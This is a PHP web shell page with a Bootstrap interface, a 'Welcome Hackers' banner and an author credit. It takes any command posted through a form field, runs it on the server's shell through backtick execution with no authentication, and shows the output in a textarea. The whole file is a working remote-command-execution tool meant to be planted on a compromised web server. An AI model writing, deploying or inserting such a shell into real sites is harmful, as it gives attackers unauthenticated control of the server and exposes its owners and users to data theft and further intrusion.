<?php 

if($_SERVER['REQUEST_METHOD'] == "POST"){

    $command = $_POST['command'];
    if(!empty($command)){
        $result = `$command`;
    }else{
        echo "";
    }
}

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WebShell</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-rbsA2VBKQhggwzxH7pPCaAqO46MgnOM80zW1RWuH61DGLwZJEdK2Kadq2F9CUG65" crossorigin="anonymous">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-kenU1KFdBIe4zVF0s0G1M5b4hcpxyD9F7jL+jjXkk+Q2h455rYXK/7HAuoJl+0I4" crossorigin="anonymous"></script>

    <style>
    
        body{
            background-image :url('https://cdn.wallpapersafari.com/67/14/DSPlV0.jpg')
        }

        #result{
            background-color:#141619;
        }
        #myName{
            color:#ced4da;
        }

    </style>

</head>
<body>
    <div class="conatainer">
        <div class="row p-5">
            <div class="col-12">
            <center>
                <h2>
                    <span class="badge bg-secondary mb-2">
                        ☠️💀 Welcome Hackers 💀☠️ 
                    </span>
                </h2>
                <strong class="mb-3" id="myName">
                    <small>
                        <i>Made By Mohamed Alalamey</i>
                    </small>
                </strong>
            </center>
            <form action="<?php $_SERVER['PHP_SELF']; ?>" method="post">
                <input type="text" class="form-control mb-3" 
                    name="command" autofocus >

                <center>
                    <input type="submit" value="Execute" 
                            class="btn btn-danger mb-5"  required>
                </center>

                <textarea name="" id="result" cols="30" rows="10"
                        class="form-control text text-danger"
                        disabled
                >
                <?php

                    if(!empty($_POST['command'])){
                        if (!isset($result)) {
                            echo("Command Not Found");
                        }else{
                            echo $result;
                        }
                    }
                    else{
                        echo("Result Not Found");
                    }
                ?>
                </textarea>        
            </form>
            </div>
        </div>
    </div>
</body>
</html>